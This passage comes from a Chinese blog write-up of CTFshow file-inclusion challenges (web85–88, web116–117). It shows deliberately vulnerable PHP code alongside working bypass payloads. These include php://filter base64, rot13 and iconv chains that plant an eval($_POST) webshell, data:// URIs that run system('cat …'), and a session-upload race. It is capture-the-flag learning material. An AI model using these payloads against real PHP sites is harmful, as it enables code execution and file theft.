punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>知识点：</p>\n<blockquote>\n<p>file_exists — 检查文件或目录是否存在,如果由指定的文件或目录存在则返回 <strong><code>true</code></strong>，否则返回 <strong><code>false</code></strong>。</p>\n<p>file_get_contents — 将整个文件读入一个字符串,函数返回读取到的数据， 或者在失败时返回 <strong><code>false</code></strong>。</p>\n<p>strpos — 查找字符串首次出现的位置,返回 needle 存在于 <code>haystack</code> 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 <strong><code>false</code></strong>。</p>\n</blockquote>\n<p>方法：</p>\n<p>还是web82的方法</p>\n<p>原因是：</p>\n<p>session.upload_progress.cleanup = on（默认开启）</p>\n<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容</p>\n<p>我们在设置session文件后，被删除了，但是一个线程刚好进行if判断，文件存在，且文件内容为空，那么就会准备执行include，同时另一个线程刚好设置了完整的session文件，那么就会被包含进去。</p>\n<h2><a id=\"WEB86_431\"></a>WEB86</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n \n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'还要秀？'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">set_include_path</span><span class=\"token punctuation\">(</span>还要秀？<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n    \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>知识点：</p>\n<blockquote>\n<p>define — 定义一个常量</p>\n<p>dirname：返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（‘<code>.</code>’），表示当前目录。否则返回的是把 <code>path</code> 中结尾的<code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串。</p>\n<p>set_include_path — 设置include函数中 include_path 配置选项，成功时返回旧的 include_path或者在失败时返回 <strong><code>false</code></strong>。</p>\n<p><a href=\"https://www.php.net/manual/zh/function.include.php\">include</a></p>\n<p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 <code>include</code> 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 <code>include</code> 结构会发出一条警告；这一点和require 不同，后者会发出一个致命错误。</p>\n<p>如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 <code>\\</code> 开头，在 Unix/Linux 下以 <code>/</code> 开头）还是当前目录的相对路径（以 <code>.</code> 或者 <code>..</code> 开头）——include_path都会被完全忽略。例如一个文件以 <code>../</code> 开头，则解析器会在当前目录的父目录下寻找该文件。</p>\n</blockquote>\n<p>方法：</p>\n<p>还是web82的方法</p>\n<p>因为设置了目录/tmp/sess_flag，所以set_include_path对我们的脚本没有用。</p>\n<h1><a id=\"Web_87_472\"></a>Web 87</h1>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die('大佬别秀了');?&gt;\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    \n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p><a href=\"https://www.cnblogs.com/vege/p/12675562.html\">base64编解码</a></p>\n<p>base64转换后的字符串的数量肯定是4的倍数, 不足4的末尾补‘=’</p>\n<p>分析：</p>\n<p>向文件输入内容的时候会在开头写入死亡函数，从而导致直接结束代码的执行，我们要做的就是绕过这个死亡函数。</p>\n<p>编码时，转换成Base64的最小单位就是3个字节</p>\n<p>解码时，4个字节为一组；PHP在解码base64时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64的字符选用了\"A-Z、a-z、0-9、+、/\" 64个可打印字符）所以，通过base64解码过滤之后就只有 phpdie6 个字符我们就要添加2个字符让phpdie和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。</p>\n<p>其次：因为filename那里需要urldecode，而get传参的时候会进行一次urldecode，所以我们的filename需要两次urlencode。?file=php://filter/write=convert.base64-decode/resource=1.php这里需要进行url全编码，不然php会被过滤掉。</p>\n<p>将&lt;?php eval($_POST[1]);?&gt;进行base64编码为：PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+<br/> 注意如果直接传入content，这里的+会被当做空格处理，所以在base64解码的时候就会忽略空格，自动在后面加上一个=：即PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=</p>\n<p>解码后：&lt;?php eval($_POST[1]);? 这样传进去就会报错</p>\n<p>解决方法：将+进行urlencode</p>\n<p><a href=\"https://xz.aliyun.com/t/8163#toc-7\">file_put_content和死亡·杂糅代码之缘</a><br/> 死亡绕过file_put_content,杂糅代码分解成php无法识别的代码<br/> 分析代码，需要对$file进行两次url加密，hackbar自带URL编码不能进行全编译，用其他工具进行全编译</p>\n<pre><code>file=php://filter/write=string.rot13/resource=1.php\n//进行两次URL全编译\n</code></pre>\n<pre><code>file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30\n\n</code></pre>\n<p>file=php://filter/write=string.rot13/resource=1.php</p>\n<p>php://filter伪协议名称</p>\n<p>write=string.rot13过滤器通道 将传入的1.php的字母进行13位平移(凯撒加密，移动13位)</p>\n<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-mgJ43PAU-1648740630385)(C:\\Users\\lenovo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220331225434911.png)]</p>\n<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-xpqnw1vk-1648740630386)(C:\\Users\\lenovo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220331225438675.png)]</p>\n<h1><a id=\"Web_88_539\"></a>Web 88</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>正则匹配黑名单。</p>\n<p>发现过滤很多，但是没有过滤 : 那我们就可以使用PHP伪协议 这里使用的是 data://text/plain;base64,poc 和79差不多 只是要在编码成base64的时候要去掉 ＝</p>\n<p>实际上就是去掉base64后的=，作为填充使用，不影响结果</p>\n<pre><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4\n?file=data:text/plain,&lt;?php phpinfo()?&gt;\n//base64取出=\n?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgKi5waHAnKTs/Pg\n\n</code></pre>\n<h1><a id=\"web116_568\"></a>web116</h1>\n<p>下载文件，png文件。</p>\n<p><img alt=\"image-20220331232018888\" src=\"..\\..\\static\\image\\51c04e0abe8a16f4847f50b034fd83d4.png\"/></p>\n<p>基本都过滤了</p>\n<p>但用的是file_get_contents，直接输入file=flag.php，用view-source查看网页源码,也可以抓包获得。</p>\n<p><img alt=\"image-20220331232118204\" src=\"..\\..\\static\\image\\728e4ff20272366fb1a8366d855f7ca1.png\"/></p>\n<h1><a id=\"Web_117_582\"></a>Web 117</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'too young too simple sometimes naive!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'contents'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php die();?&gt;\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$contents</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\n</code></pre>\n<p>死亡绕过不同变量</p>\n<p>这里过滤了 base64那就是 base64-decode。</p>\n<p>过滤了string,不能使用字符过滤器了，</p>\n<p>但是convert还是可以使用 转换过滤器</p>\n<p>可以使用convert.iconv.*<br/> <a href=\"https://xz.aliyun.com/t/8163#toc-12\">file_put_content和死亡·杂糅代码之缘</a><br/> **原理：**对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除。</p>\n<p>构造</p>\n<pre><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?\n\n</code></pre>\n<p><img alt=\"image-20220331232328670\" src=\"..\\..\\static\\image\\be9453b85bf595140214340238634fc7.png\"/></p>\n<p>有很多题目都是看了大佬的博客才有思路，还有一些具体的知识没有搞懂</p>\n<p><a href=\"https://blog.csdn.net/qq_46918279/article/details/120106832?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2\">(112条消息) CTFSHOW-文件包含__Monica_的博客-CSDN博客</a>（大神博客）</p>\n<p>对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除。</p>\n<p>构造</p>\n<pre><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?\n\n</code></pre>\n<p>[外链图片转存中…(img-e8KUX1H5-1648740630387)]</p>\n<p>有很多题目都是看了大佬的博客才有思路，还有一些具体的知识没有搞懂</p>\n<p><a href=\"https://blog.csdn.net/qq_46918279/article/details/120106832?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2\">(112条消息) CTFSHOW-文件包含__Monica_的博客-CSDN博客</a>（大神博客）</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-04-02 21:13:14", "summary": "文件包含留言连接数据库查看留言连接数据库登录连接数据库注册连接数据库代码的重复留言查看留言连接数据库单独的文件登录注册程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用"}